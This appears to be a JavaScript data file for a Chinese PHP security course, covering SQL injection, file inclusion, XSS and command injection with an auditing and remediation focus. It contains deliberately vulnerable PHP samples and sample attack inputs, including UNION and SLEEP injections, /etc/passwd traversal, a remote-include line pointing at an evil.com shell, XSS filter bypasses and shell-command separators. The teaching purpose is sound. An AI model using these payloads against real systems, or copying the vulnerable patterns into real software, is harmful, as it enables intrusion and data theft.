// PHP 学习站 v2 · 第 10-13 章：四大经典漏洞
var CHAPTERS_C = [
{
id:10, title:"SQL 注入的 PHP 原理", stage:"四大经典漏洞",
intro:"SQL 注入常年霸榜 OWASP Top 10，也是你在靶场里练得最多的漏洞。<b>这一章的重点不是「怎么打」，而是「代码里长什么样、审计时怎么一眼认出来」。</b>",
sections:[
{h:"10.1 漏洞原型：三种拼接位置", code:[
`<?php
// ① 值拼接（最常见）
$id  = $_GET['id'];
$sql = "SELECT * FROM user WHERE id = " . $id;
mysqli_query($conn, $sql);
// 传入 id=1 OR 1=1  -> 条件恒真，返回全表

// ② 字符型值拼接（需要闭合引号）
$name = $_GET['name'];
$sql = "SELECT * FROM user WHERE name = '$name'";
// 传入 name=admin' --   -> 后半段被注释，绕过密码校验

// ③ 结构拼接（表名/列名/ORDER BY）—— 无法用占位符，只能白名单
$order = $_GET['order'];
$sql = "SELECT * FROM user ORDER BY $order";
// 传入 order=(SELECT SLEEP(5))  -> 时间盲注

// ④ LIMIT 后面的数字（老版本 MySQL 不支持占位符）
$limit = $_GET['limit'];
$sql = "SELECT * FROM user LIMIT $limit";`],
note:"<b>审计时按这四种模式去搜：</b>找 <code>SELECT / INSERT / UPDATE / DELETE</code> 关键字，看它们所在的行有没有用 <code>.</code> 拼接变量。前两种是「值」，第三种是「结构」（最容易被漏），第四种是「LIMIT」。<b>四种都要看，不要只盯 WHERE。</b>"},
{h:"10.2 攻击者做了什么（原理，不是教程）", code:[
`原始语句（字符型）：
  SELECT * FROM user WHERE name = '$name' AND pass = '$pass'

第一步 闭合引号：
  传入 name = admin'
  变成    ... WHERE name = 'admin'' AND ...
  报错 -> 说明引号参与了语法，可注入

第二步 注释掉后面：
  传入 name = admin' -- 
  变成    ... WHERE name = 'admin' -- ' AND ...
  结果    后半段被注释掉，只凭用户名就通过校验

第三步 联合查询拖数据（有回显时）：
  传入 name = ' UNION SELECT 1, username, password FROM user -- 
  结果    原结果集后面并上一条自己构造的查询

数字型则更简单，连引号都不用闭合：
  id = 1 OR 1=1`],
tip:"<b>理解这四步的意义在于：你知道攻击者会往哪里插字符，就知道预处理为什么能挡住它。</b>预处理把语句结构提前编译好，上面这些引号、注释、UNION 全部只能当作「一个普通字符串值」——查不到东西，但注入不成立。"},
{h:"10.3 为什么「过滤」经常不顶用", tbl:[
["常见防御写法","绕过方式","根本问题"],
["`str_replace(\"'\", \"\", $id)`","数字型注入根本不用引号","防错了类型"],
["`addslashes($id)`","数字型不用引号；GBK 编码下宽字节可吃掉反斜杠","转义依赖上下文"],
["`preg_match('/union/i', $sql)`","`UNion`、`/**/union`、URL 编码","黑名单永远不全"],
["`is_numeric($id)` 后拼进 SQL","`1e3`、`0x1A` 也算数字（见第 3 章）","校验不严"],
["只在前端 JS 校验","抓包直接改请求","前端不可信"],
["WAF 拦截","编码、注释、大小写、分块变形","规则总有盲区"]],
warn:"<b>结论：黑名单过滤只能减少噪音，不能作为防御。</b>唯一正确的做法是预处理（参数绑定）；不能参数化的位置（表名、列名、ORDER BY）用白名单。<b>审计时只要看到「拼接用户输入进 SQL」，就直接判定为漏洞——不管它前面加了多少过滤函数。</b>"},
{h:"10.4 修复：两种预处理的写法", code:[
`<?php
// ✅ 方案一：mysqli 预处理
$stmt = mysqli_prepare($conn, "SELECT id, username FROM user WHERE id = ?");
mysqli_stmt_bind_param($stmt, "i", $id);      // i=整型 s=字符串 d=浮点
mysqli_stmt_execute($stmt);
$result = mysqli_stmt_get_result($stmt);
while ($row = mysqli_fetch_assoc($result)) {
    echo htmlspecialchars($row['username'], ENT_QUOTES, 'UTF-8');
}

// ✅ 方案二：PDO 预处理（推荐，写法更简洁）
$pdo = new PDO('mysql:host=localhost;dbname=test;charset=utf8mb4', 'app', 'pass', [
    PDO::ATTR_ERRMODE          => PDO::ERRMODE_EXCEPTION,
    PDO::ATTR_EMULATE_PREPARES => false,   // 关闭模拟预处理
]);
$stmt = $pdo->prepare('SELECT id, username FROM user WHERE id = ?');
$stmt->execute([$id]);

// 命名占位符
$stmt = $pdo->prepare('SELECT * FROM user WHERE name = :name');
$stmt->execute([':name' => $name]);`]},
{h:"10.5 不能参数化的位置：只能白名单", code:[
`<?php
// ❌ ORDER BY 用占位符是不行的（占位符只能代表「值」）
$stmt = $pdo->prepare('SELECT * FROM user ORDER BY ?');   // 无效！

// ✅ 正确做法一：白名单映射
$allow = ['id' => 'id', 'name' => 'username', 'time' => 'created_at'];
$key   = $_GET['sort'] ?? 'id';
$col   = $allow[$key] ?? 'id';
$dir   = (($_GET['dir'] ?? 'desc') === 'asc') ? 'ASC' : 'DESC';
$sql   = "SELECT * FROM user ORDER BY $col $dir LIMIT 20";

// ✅ 正确做法二：用 switch 限定（更直白）
switch ($_GET['order'] ?? '') {
    case 'price': $order = 'price';        break;
    case 'time':  $order = 'created_at';   break;
    default:      $order = 'id';
}

// 表名同理：永远不要用用户输入当表名，只能映射
$tables = ['user' => 'user', 'order' => 'orders'];
$t = $tables[$_GET['t'] ?? 'user'] ?? 'user';`],
warn:"<b>「用了预处理就安全」是一个危险的错觉。</b>真实项目里死在 ORDER BY、表名、LIKE 拼接上的注入非常多——因为开发者以为参数化是万能的。<b>审计时专门搜 <code>ORDER BY $</code>、<code>FROM $</code>、<code>LIMIT $</code> 这三种模式。</b>"},
{h:"10.6 审计判断标准（背下来）", tbl:[
["看到什么","结论"],
["`\"...\" . $_GET['x']` 拼进 SQL","SQL 注入（值类型）"],
["`\"... $x ...\"` 双引号内插值进 SQL","SQL 注入（同上）"],
["`ORDER BY $x` / `FROM $x` / `LIMIT $x`","SQL 注入（结构类型），且预处理也挡不住"],
["变量来自数据库又被拼进 SQL","<b>二次注入</b>（第 15 章）"],
["`prepare` + `execute([$x])`","安全"],
["`prepare` 但用 `$pdo->query($sql)` 拼接","不安全（没走预处理）"],
["字符串里出现 `addslashes` / `str_replace(\"'\")` 后仍拼接","<b>依然判定为漏洞</b>"]],
tip:"<b>把这一章和你的 DVWA 连起来：</b>打开 DVWA 的 SQL Injection 模块，把安全级别在 Low / Medium / High / Impossible 之间切换，每次点 <b>View Source</b>——你会看到 Low 是拼接、Medium 加了没用的转义、High 加了 LIMIT 1、Impossible 才是真正的预处理。<b>「DVWA 靶场」页有逐模块的对照说明。</b>"}
],
secview:"SQL 注入在 PHP 里只有一个根因：<b>把用户输入拼进了 SQL 字符串</b>。审计动作是三步：搜 SQL 关键字 → 看有没有拼接变量 → 看变量是否可控。修复只有两条：<b>能参数化的参数化，不能参数化的白名单</b>。其余的过滤、转义、WAF，都只是缓解。"
},
{
id:11, title:"文件包含漏洞（LFI / RFI）", stage:"四大经典漏洞",
intro:"include 本来是组织代码的好工具，但只要「包含哪个文件」由用户决定，就变成了 LFI/RFI。<b>它的危害上限极高：读源码 → 拿数据库口令 → getshell。</b>",
sections:[
{h:"11.1 常见写法与漏洞点", code:[
`<?php
// 正常用途：公共头尾、模板
include 'header.php';
require_once 'config.php';

// ⚠️ 漏洞写法一：直接拼用户输入
$page = $_GET['page'];
include $page . '.php';
// 传入 page=../../../../etc/passwd  -> 读系统文件（LFI）

// ⚠️ 漏洞写法二：带前缀目录（可用 ../ 跳出）
$page = $_GET['page'];
include 'pages/' . $page . '.php';
// 传入 page=../../../../etc/passwd%00  （PHP 5.3 之前的 %00 截断）

// ⚠️ 漏洞写法三：允许 http:// 就是 RFI
include $_GET['tpl'];
// 传入 tpl=http://evil.com/shell.txt  -> 远程代码执行（需 allow_url_include=On）`]},
{h:"11.2 LFI 能读什么", code:[
`① 系统文件
   ?page=../../../../etc/passwd          （Linux）
   ?page=../../../../windows/win.ini      （Windows）

② 源码与配置（最有价值）
   ?page=../config.php
   ?page=../../config/database.php
   -> 拿到数据库账号密码、第三方密钥

③ 用 php://filter 读源码（不会被当 PHP 执行，而是输出 base64）
   ?page=php://filter/convert.base64-encode/resource=index.php
   -> 页面输出一长串 base64，解码后就是源码
   为什么需要它：直接包含 .php 会被执行，看不到源码；用过滤器就能「把文件当数据读」

④ 读日志（getshell 的关键一步，见 11.3）
   ?page=../../../../var/log/apache2/access.log`],
note:"<b><code>php://filter</code> 是 LFI 里最重要的技巧。</b>它属于 PHP 的「流包装器」，还有 <code>php://input</code>（读请求体）、<code>php://filter</code>（转码读写）。<b>审计时看到 include 参数可控，就要立刻想到：攻击者能读源码、能读日志、甚至能读 /proc/self/environ。</b>"},
{h:"11.3 从 LFI 到 getshell 的四条路", tbl:[
["路径","原理","前提"],
["包含日志文件","先把 PHP 代码写进访问日志（UA 或 URL 里），再包含日志文件执行","日志可读、路径已知"],
["配合文件上传","上传一个「图片马」（内容含 PHP），再包含它执行","存在上传点（第 14 章）"],
["包含 session 文件","把 payload 写进 session（如用户名），再包含 /tmp/sess_xxx","session 路径已知"],
["包含 /proc/self/environ","把 payload 放在 UA 里，读该文件时触发","Linux + 权限允许"],
["RFI 直接远程包含","包含远程服务器上的 PHP 文件","allow_url_include=On（默认 Off）"]],
warn:"<b>这张表只用于理解「LFI 为什么危险」，不是操作指南。</b>它说明一件事：<b>LFI 往往不是终点，而是跳板</b>——单独一个文件包含可能只是「读文件」，但配合上传点、日志、session，就能升级成 RCE。<b>审计时看到 LFI，要把它当成高危而不是中危。</b>"},
{h:"11.4 修复：白名单映射（唯一正解）", code:[
`<?php
// ❌ 错误做法：过滤 ../ （可被 ....// 、编码绕过）
$page = str_replace('../', '', $_GET['page']);
include $page . '.php';

// ✅ 正确做法一：白名单映射
$allow = [
    'home'    => 'pages/home.php',
    'about'   => 'pages/about.php',
    'contact' => 'pages/contact.php',
];
$key = $_GET['page'] ?? 'home';
if (!array_key_exists($key, $allow)) {
    $key = 'home';                     // 不在白名单就回默认页
}
include $allow[$key];

// ✅ 正确做法二：如果必须用路径，就规范化后校验前缀
$base = realpath(__DIR__ . '/pages');
$file = realpath($base . '/' . basename($_GET['page'] ?? 'home.php'));
if ($file === false || strpos($file, $base) !== 0) {
    die('非法路径');                    // 规范化后仍不在允许目录内 -> 拒绝
}
include $file;

// 另外：php.ini 里确保这两个配置
//   allow_url_include = Off      （禁止远程包含）
//   open_basedir = /var/www      （限制 PHP 能访问的目录）`]},
{h:"11.5 审计判断标准", tbl:[
["看到什么","结论"],
["`include $_GET['page']`","文件包含漏洞（LFI，若允许 http 则可能 RFI）"],
["`include 'dir/' . $x . '.php'`","LFI（可用 ../ 跳出目录）"],
["`include $config['tpl']` 且配置可被写","间接 LFI"],
["用 `str_replace('../')` 过滤","<b>仍判定为漏洞</b>（可绕过）"],
["白名单数组映射后 include","安全"],
["`allow_url_include = On`","配置风险（即使代码没问题也要改）"]],
tip:"<b>和 DVWA 对接：</b>DVWA 的 <b>File Inclusion</b> 模块就是标准 LFI 靶场，Low 级别直接读 <code>/etc/passwd</code>，Impossible 级别用白名单。<b>打完记得看一眼两个版本的源码差异</b>——那几行就是这一节的答案。"}
],
secview:"文件包含的审计要点：<b>搜 include / require 后面有没有变量</b>。有变量就是候选漏洞；至于危害多大，取决于能不能配上上传点、日志、session 把 LFI 升级成 RCE。<b>修复永远只有白名单一条路——过滤 ../ 是假的防御。</b>"
},
{
id:12, title:"XSS 的 PHP 原理与输出编码", stage:"四大经典漏洞",
intro:"SQL 注入是「输入」环节的漏洞，XSS 是「<b>输出</b>」环节的漏洞。这一章的重点是搞清楚「输出到不同地方，要用不同的编码」——很多人只知道一个 htmlspecialchars，结果在属性、JS、URL 里照样被打。",
sections:[
{h:"12.1 本质：把用户输入原样输出到 HTML", code:[
`<?php
// ❌ 反射型 XSS 的最小模型
$name = $_GET['name'] ?? '';
echo '你好，' . $name . '！';
// 访问 ?name=<script>alert(1)</script>
// 浏览器把 <script> 当成标签解析并执行

// ❌ 存储型：先入库，再输出
$content = $_POST['content'];
// INSERT INTO comments (content) VALUES ('$content')   // 存进去
// 之后任何页面输出这条留言时，都会执行里面的脚本
echo $row['content'];`],
note:"<b>反射型 vs 存储型的关键差别：</b>反射型是「立刻回显一次」，需要诱导受害者点击链接；存储型是「先进数据库，之后所有访问该页面的人都中招」。<b>存储型危害大得多</b>——它相当于在页面里留了一个持久的后门。"},
{h:"12.2 四种输出上下文，四种编码", tbl:[
["输出位置","例子","正确编码"],
["HTML 正文","`<p>你好 <?= $name ?></p>`","`htmlspecialchars($s, ENT_QUOTES, 'UTF-8')`"],
["HTML 属性","`<input value=\"<?= $s ?>\">`","`htmlspecialchars` + <b>属性必须加引号</b>"],
["JavaScript","`<script>var n = '<?= $s ?>';</script>`","`json_encode($s, JSON_HEX_TAG\\|JSON_HEX_AMP)`"],
["URL 参数","`<a href=\"/go?u=<?= $s ?>\">`","`urlencode($s)` 或 `rawurlencode`"],
["CSS / 其他","`style=\"color:<?= $s ?>\"`","尽量不要；必须用则严格白名单"]],
warn:"<b>只用一个 htmlspecialchars 是不够的。</b>它解决的是「HTML 正文和属性」这两类上下文；输出到 <code>&lt;script&gt;</code> 里时要换成 <code>json_encode</code>（否则 <code>&lt;/script&gt;</code> 能闭合脚本块），输出到 URL 里要换成 <code>urlencode</code>。<b>审计时看到 <code>&lt;script&gt;</code> 里插 PHP 变量，即使外面有 htmlspecialchars 也要警惕</b>——这是 XSS 绕过里非常经典的一条。"},
{h:"12.3 常见绕过手法（用于理解过滤为什么不够）", tbl:[
["防御写法","绕过方式","原因"],
["只过滤 `<script>`","`<img src=x onerror=alert(1)>`、`<svg onload=...>`","可用的事件属性太多了"],
["只过滤小写 `script`","`<ScRiPt>`、`<scr<script>ipt>`","HTML 标签名不区分大小写"],
["把 `alert` 列入黑名单","`confirm`、`prompt`、`eval`、`Function`","可用的函数太多"],
["过滤 `<` 和 `>`","属性里不需要尖括号：`\" onmouseover=alert(1) x=\"`","取决于上下文"],
["`addslashes` 转义引号","HTML 里大多不需要引号","防错了东西"],
["黑名单关键字","HTML 实体编码、`&#x61;` 十六进制","浏览器会自动解码"]],
tip:"<b>结论和 SQL 注入一样：黑名单永远不全。</b>XSS 的正确防御是<b>输出编码</b>（白名单式的转义），而不是过滤输入。<b>审计时判断标准：这个变量输出前，有没有经过「与上下文匹配的编码函数」？</b>"},
{h:"12.4 修复：封装统一的输出函数", code:[
`<?php
// 全站统一的输出函数（放在公共文件里）
function e($s) {
    return htmlspecialchars((string)$s, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
}

// HTML 正文 / 属性
echo '<p>你好，' . e($name) . '</p>';
echo '<input value="' . e($nick) . '">';

// JavaScript 上下文
echo '<script>var nick = ' . json_encode($nick, JSON_HEX_TAG | JSON_HEX_AMP | JSON_HEX_APOS | JSON_HEX_QUOT) . ';</script>';

// URL 上下文
echo '<a href="/go?u=' . urlencode($url) . '">跳转</a>';

// 配套加固（即使编码漏了也能兜住一部分）
//   Cookie 加 HttpOnly   -> JS 读不到 session（防会话劫持）
//   设置 CSP 头          -> 限制可执行的脚本来源
//   header('Content-Security-Policy: default-src \\'self\\'');
//   输出 JSON 接口时用 header('Content-Type: application/json')`],
note:"<b>HttpOnly 和 CSP 是「纵深防御」而不是替代品。</b>HttpOnly 只能防「偷 Cookie」，不能防「伪造请求」；CSP 能显著降低 XSS 的利用价值，但配置复杂、兼容性有坑。<b>根子仍然是：输出前编码。</b>"},
{h:"12.5 审计判断标准", tbl:[
["看到什么","结论"],
["`echo $_GET['x']` / `<?= $_GET['x'] ?>`","反射型 XSS"],
["`echo $row['content']`（内容来自用户提交）","存储型 XSS"],
["`echo htmlspecialchars($x)`","安全（正文/属性上下文）"],
["`echo htmlspecialchars($x)` 但输出在 `<script>` 内","<b>仍可能 XSS</b>（需 json_encode）"],
["`echo htmlspecialchars($x)` 但没加 ENT_QUOTES","属性未加引号时可绕过"],
["前端 `innerHTML = location.hash`","DOM 型 XSS（后端看不到，要审前端 JS）"]],
tip:"<b>DOM 型 XSS 是审计里最容易漏的</b>：它完全不经过后端，payload 一直在浏览器里流转（比如 <code>document.write(location.hash)</code>、<code>innerHTML = ...</code>）。<b>审计 PHP 的同时，记得扫一遍页面里的 JS。</b>"}
],
secview:"XSS 的审计动作：<b>搜所有输出点（echo / print / printf / &lt;?=），追输出内容里有没有用户可控数据，再看有没有经过与上下文匹配的编码。</b>记住四种上下文（HTML / 属性 / JS / URL）对应四种编码，只用一个 htmlspecialchars 是不够的。"
},
{
id:13, title:"命令执行漏洞（RCE）", stage:"四大经典漏洞",
intro:"命令注入是危害最顶级的一类漏洞——<b>一旦成立，等于服务器已经被控制</b>。PHP 提供了多个执行系统命令的函数，用错就是灾难。",
sections:[
{h:"13.1 能执行系统命令的函数", code:[
`<?php
// 会执行操作系统命令的函数（记全）
system('whoami');            // 执行并直接输出结果
exec('whoami', $out);        // 执行，结果存到数组 $out
shell_exec('whoami');        // 执行并返回结果字符串
passthru('whoami');          // 执行并原样输出（适合二进制）
popen('whoami', 'r');        // 打开进程管道
proc_open('whoami', $spec, $pipes);  // 更底层的方式
$out = \`whoami\`;            // 反引号，等价于 shell_exec

// 会执行 PHP 代码的函数（同样是 RCE）
eval('echo 1;');                       // 执行任意 PHP 代码
assert('phpinfo()');                   // 老版本会执行字符串
create_function('$a', 'return $a;');   // 已废弃，但老代码里有
preg_replace('/a/e', 'phpinfo()', $s); // /e 修饰符会执行（PHP 5.5 起废弃）
call_user_func($_GET['fn'], $arg);     // 可控函数名 = 任意函数调用`],
note:"<b>审计时的搜索式：</b>把上面这些函数名在代码里全部搜一遍（建议写成一个正则），逐个看参数来源。<b>另外别忘了「可变函数」：<code>$fn = $_GET['fn']; $fn();</code> 这种写法等价于任意函数调用，比参数注入更严重。</b>"},
{h:"13.2 命令注入是怎么发生的", code:[
`<?php
// 一个「Ping 检测」功能（真实项目里很常见）
$ip  = $_GET['ip'];
$cmd = 'ping -n 4 ' . $ip;      // Windows 用 -n；Linux 用 -c
system($cmd);

// 正常传入 ip=127.0.0.1  -> ping 一次
// 传入 ip=127.0.0.1 & whoami  -> 先 ping，再执行 whoami

// 命令分隔符（Linux 和 Windows 都有效）
//   ;        顺序执行下一条
//   |        管道，把前一条的输出给后一条
//   ||       前一条失败才执行后一条
//   &&       前一条成功才执行后一条
//   &        后台执行
//   \`...\`  命令替换
//   $(...)   命令替换

// 换行符 %0a 也是分隔符（WAF 常漏）

// 参数注入：不一定要有分隔符
// 例如 tar、rsync、find 等命令的某些参数本身就能执行命令`],
warn:"<b>PHP 有个容易被忽略的坑：<code>system()</code> 这类函数会把输出直接打到响应里；但 <code>exec()</code> / <code>shell_exec()</code> 需要你自己 echo 才看得到。</b>审计时判断「有没有回显」很重要——无回显的命令注入要靠时间盲注或外带（DNS/HTTP）来确认。"},
{h:"13.3 无回显时怎么确认（审计与验证思路）", tbl:[
["情况","验证方式"],
["有回显","直接看到命令输出"],
["无回显（结果没输出）","用延时命令：<code>sleep 5</code> / <code>ping -n 6 127.0.0.1</code>，看响应时间"],
["无回显且不能延时","外带：让目标去请求一个你能看到的地方（DNS 查询 / HTTP 请求）"],
["参数被过滤","换分隔符、换命令、编码、用通配符拼命令名"]],
note:"<b>审计时不需要真的去验证「能不能执行」</b>——看到 <code>system($cmd)</code> 且 <code>$cmd</code> 里有用户输入，就已经可以判定为命令注入漏洞并给出修复建议。验证是 PoC 阶段的事，要遵守第 1 章的红线。"},
{h:"13.4 修复：优先级从高到低", code:[
`<?php
// ① 最好：根本不用系统命令，用 PHP 自己的函数实现
//    例如「下载文件」不要调 wget/curl，用 file_get_contents + file_put_contents
//    「发邮件」不要调 sendmail，用现成的邮件库

// ② 次好：白名单校验（限定格式，而不是过滤字符）
$ip = $_GET['ip'] ?? '';
if (!filter_var($ip, FILTER_VALIDATE_IP)) {
    die('参数不是合法 IP');
}
$cmd = 'ping -c 4 ' . escapeshellarg($ip);
system($cmd);

// ③ 辅助：转义参数（注意它只保护「参数」，不能防住「拼进命令本身」）
$safe = escapeshellarg($user_input);   // 把参数包成单引号字符串
// 注意：escapeshellcmd 是转义「整条命令」，用错会帮倒忙

// ④ 兜底：在 php.ini 里禁用危险函数
//    disable_functions = system,exec,shell_exec,passthru,popen,proc_open,passthru
//    注意：disable_functions 有绕过史，只作为纵深防御，不能当唯一防线

// ⑤ 运行环境：PHP 以低权限用户运行，即使 RCE 也限制危害`],
warn:"<b><code>escapeshellarg()</code> 不是万能的。</b>它只保护「作为参数的值」；如果用户输入被拼进了命令本身（比如 <code>system($user_cmd)</code>），转义毫无意义。<b>审计时看到「有转义」不要直接判安全——要看转义覆盖的是哪个变量。</b>"},
{h:"13.5 审计判断标准", tbl:[
["看到什么","结论"],
["`system($_GET['x'])`","命令执行（RCE）"],
["`system('ping ' . $ip)` 且 $ip 可控","命令注入"],
["`exec($cmd)` 且 $cmd 由用户拼接","命令注入"],
["`eval($x)` / `assert($x)` / `call_user_func($x)`","代码执行（RCE）"],
["`$fn = $_GET['fn']; $fn();`","任意函数调用（RCE）"],
["`escapeshellarg` 之后拼进命令","安全（前提是它保护了那个变量）"],
["`disable_functions` 已禁用","缓解手段，不能抵消漏洞本身"]],
tip:"<b>和 DVWA 对接：</b>DVWA 的 <b>Command Injection</b> 模块就是标准的 ping 场景，Low 级别直接 <code>127.0.0.1 & whoami</code> 就能看到执行结果；切到 Impossible 看它用了什么——<code>explode</code> 拆成数组 + 白名单校验每个部分。<b>这是「白名单优于转义」的最好例子。</b>"}
],
secview:"命令执行的审计动作：<b>先搜函数名（system/exec/shell_exec/passthru/eval/call_user_func…），再追参数来源，最后看有没有白名单。</b>修复优先级是「不调系统命令 &gt; 白名单校验 &gt; 转义参数 &gt; 禁用函数」。任何一个环节能挡住，这条链就断了。"
}
];
